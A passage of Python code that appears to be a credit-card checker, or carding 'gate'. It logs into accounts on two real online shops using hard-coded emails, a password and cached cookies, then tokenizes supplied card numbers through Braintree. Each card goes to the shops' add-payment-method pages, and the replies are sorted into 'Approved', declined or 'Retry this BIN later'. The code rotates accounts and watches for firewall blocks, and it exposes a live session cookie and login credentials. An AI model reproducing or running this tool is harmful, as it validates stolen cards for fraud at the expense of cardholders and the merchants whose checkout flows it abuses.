	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		for varp in varps:
			up(varp)
	headers = {
	    'authority': 'honeybros.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': 'GlobalE_Data=%7B%22countryISO%22%3A%22EG%22%2C%22currencyCode%22%3A%22EGP%22%2C%22cultureCode%22%3A%22ar%22%7D; _fbp=fb.1.1716476531260.231905314670822681; sp=94606381-ee0c-4658-857e-652cef0b6171; mailchimp_landing_site=https%3A%2F%2Fhoneybros.com%2Fwp-admin%2Fadmin-ajax.php%3Faction%3Dse_async; GlobalE_Welcome_Data=%7B%22showWelcome%22%3Afalse%7D; CookieConsent={stamp:%27lJrxKRI3U5hxDKVok3RUVI6zEAzMo30ZCQgKfRRv/kXKxvelI0ws8Q==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1716476539955%2Cregion:%27eg%27}; _gcl_au=1.1.1713903955.1716476540; _ga=GA1.1.1674515673.1716476534; _clck=1e520d8%7C2%7Cfm0%7C0%7C1604; _hjSessionUser_2021821=eyJpZCI6IjY3NzVlOWJkLWY0MGItNTM5ZS1iODBhLTFiYTA5MzIyZjQ2MCIsImNyZWF0ZWQiOjE3MTY0NzY1NDE1MjcsImV4aXN0aW5nIjp0cnVlfQ==; PHPSESSID=1l59e98j3deommshfbponvdcam; mailchimp_user_email=visaspam77%40gmail.com; wordpress_logged_in_5e4e162cb0e694b343693ae49b820323=visaspam77%40gmail.com%7C1717686192%7CtZjMoXG1DA89cwo3pwk4Izta7UamfLYP0mYvNdgZOXa%7C6d6fd53569eb1cbd231a07f0be3eba486944fdfd9c942a12d9dbcc05c9afc8c7; wp_woocommerce_session_5e4e162cb0e694b343693ae49b820323=47685%7C%7C1716649325%7C%7C1716645725%7C%7Cf48f8d3abcbbbfa0be401d84fde6f3f9; GlobalE_Gem_Data=%7B%22CartId%22%3A%2247685-%22%2C%22UserId%22%3A47685%2C%22PreferedCulture%22%3Anull%2C%22StoreCode%22%3Anull%7D; vat-status=inc; _tp_sp_ses.f67e=*; GlobalE_CT_Data=%7B%22CUID%22%3A%7B%22id%22%3A%22817703325.348239597.809%22%2C%22expirationDate%22%3A%22Thu%2C%2023%20May%202024%2016%3A44%3A53%20GMT%22%7D%2C%22CHKCUID%22%3Anull%2C%22GA4SID%22%3A699318053%2C%22GA4TS%22%3A1716480893801%7D; _hjSession_2021821=eyJpZCI6IjI5ZjVlNTBlLTcyMjQtNDIzZi05MTM4LThhZDdhNTM2M2Y3ZSIsImMiOjE3MTY0ODA4OTQxMTQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; GlobalE_SupportThirdPartCookies=true; GlobalE_Full_Redirect=false; _ga_PBEL01DRFJ=GS1.1.1716480892.2.1.1716480904.48.0.0; _clsk=1yjr6g3%7C1716483508529%7C4%7C1%7Cv.clarity.ms%2Fcollect; _tp_sp_id.f67e=aedf3f44-7ea7-48fe-bdf1-720d647b9d9e.1716476530.2.1716483526.1716476895.9e26141f-da1e-4bc1-9f65-701341c734e7; _uetsid=74547d60191511efb7955f8a87bc353f; _uetvid=74551c10191511efb14a5b55eca3d380',
	    'origin': 'https://honeybros.com',
	    'referer': 'https://honeybros.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'payment_method': 'braintree_credit_card',
	    'wc-braintree-credit-card-card-type': 'visa',
	    'wc-braintree-credit-card-3d-secure-enabled': '',
	    'wc-braintree-credit-card-3d-secure-verified': '',
	    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
	    'wc_braintree_credit_card_payment_nonce': tok,
	    'wc-braintree-credit-card-tokenize-payment-method': 'true',
	    'wc_braintree_paypal_device_data': '{"correlation_id":"e52f69f3052a2ca48ed80bf97a9f56b2"}',
	    'wc_braintree_paypal_payment_nonce': '',
	    'wc_braintree_paypal_amount': '0.00',
	    'wc_braintree_paypal_currency': 'GBP',
	    'wc_braintree_paypal_locale': 'en_gb',
	    'wc-braintree-paypal-tokenize-payment-method': 'true',
	    'woocommerce-add-payment-method-nonce': nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = requests.post('https://honeybros.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
	text=response.text
	html_text=response.text
	soup = BeautifulSoup(html_text, 'html.parser')
	if '<head><title>Not Acceptable!</title></head><body><h1>Not Acceptable!</h1><p>An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.</p></body></html>' in response.text:
		return "RISK: Retry this BIN later."
	try:
		error_message = soup.find('div', class_='woocommerce-notices-wrapper').text.strip()
		status_code_start = error_message.find('Status code') + len('Status code')
		status_code_end = error_message.find('</div>')
		result = error_message[status_code_start:status_code_end]
		if 'avs' in result or 'Invalid postal code' in result or 'Insufficient Funds' in result:
			return 'Approved'
		elif 'Card Issuer Declined CV' in result:
			return 'Card Issuer Declined CVV'
		elif 'Please wait for 20 seconds' in result:
			return "RISK: Retry this BIN later."
		else:
			return result
	except:
		result=text
	if 'Payment method successfully added.' in text:
		return "1000: Approved"
	else:
		for varp in varps:
			up(varp)
def x(ccx):
	import requests,re,base64,json,random
	from fake_useragent import UserAgent
	from bs4 import BeautifulSoup
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	ua = UserAgent()
	user = ua.random
	r = requests.session()
	varps=['shyvanazombie@gmail.com','bs01t.k@gmail.com']
	def up(varp):
		r = requests.session()
		headers = {'user-agent': user}
		response = r.post('https://atrantil.com/my-account/add-payment-method/',headers=headers)
		nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
		data = {
		    'username': varp,
		    'password': 'As12345$$$3whqk',
		    'woocommerce-login-nonce': nonce,
		    '_wp_http_referer': '/my-account/add-payment-method/',
		    'login': 'Log in'}
		response = r.post('https://atrantil.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
		nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
		enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
		dec = base64.b64decode(enc).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
		nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
					 varp : {
		  "nonce": nonce,
		  "au": au
					}
				
		}
		try:
			existing_data['x'].update(new_data)
		except:
			new_data = {"x": {
			 varp : {
		  "nonce": nonce,
		  "au": au
					}
				}
			}
		
			existing_data.update(new_data)
		import pickle
		import http.cookiejar
		with open(F'x_{varp}.pkl', 'wb') as f:
			pickle.dump(r.cookies, f)
		with open('gates.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
	with open('filechk.txt', 'r') as file:
		last_acc = file.readline()
	while True:
		varp = random.choice(varps)
		if last_acc==varp:
			pass
		else:
			break
	try:
		nonce=json_data['x'][varp]['nonce']
		au=json_data['x'][varp]['au']
		import pickle
		import http.cookiejar
		with open(f'x_{varp}.pkl', 'rb') as f:
			c = pickle.load(f)
		r = requests.session()
		r.cookies=c
	except Exception as e:
		for varp in varps:
			up(varp)
		print(e)
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'e1636f23-9ffd-4a20-b820-03fa00946fa5',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		for varp in varps:
			up(varp)
	headers = {'user-agent': user}
	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"65fe3af4644aa52e01ad1293199d2ee2","fraud_merchant_id":null,"correlation_id":"3964e5d466be3c8d7910ccacb2a56fbe"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/3mb8h3sxxp33t264/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/3mb8h3sxxp33t264"},"merchantId":"3mb8h3sxxp33t264","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"3mb8h3sxxp33t264","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"atrantil, INC.","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTU3ODIxNzEsImp0aSI6ImRhMzIyMjZlLTY4NmItNDliNy1iNzhjLTdmYzk4M2UzNWI0YiIsInN1YiI6IjNtYjhoM3N4eHAzM3QyNjQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjNtYjhoM3N4eHAzM3QyNjQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.iIQlR8O-0GFGD8Df2fTcfaUYAV7vwjzGa_9NFX9fBnsQitKPJUL9ZiU_9zvaCZxrbhZiSrMZjl4q19Zp_be2fw","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"atrantil, INC.","clientId":"AXJEj2OlIX6JG4HQc37tL8Qd5LwRQiUbhTyoXtJHKQkMrAc98q9QeGoNREbAMa6ONQkyQ8BOVfPSq7yJ","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"atrantilinc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = r.post(
	    'https://atrantil.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'avs' in result or 'Invalid postal code' in result or 'Insufficient Funds' in result:
			return 'Approved'
		elif 'Please wait for 20 seconds' in result:
			return "RISK: Retry this BIN later."
		else:
			return result
	else:
		result=text
	if '<head><title>Not Acceptable!</title></head><body><h1>Not Acceptable!</h1><p>An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.</p></body></html>' in response.text:
		return "RISK: Retry this BIN later."
		
	if 'Payment method successfully added.' in text:
		return "1000: Approved"
	elif 'risk_threshold' in text:
		return "RISK: Retry this BIN later."
	elif 'Please wait for 20 seconds' in text:
		return "RISK: Retry this BIN later."
	else:
		for varp in varps:
			up(varp)
		return "RISK: Retry this BIN later."

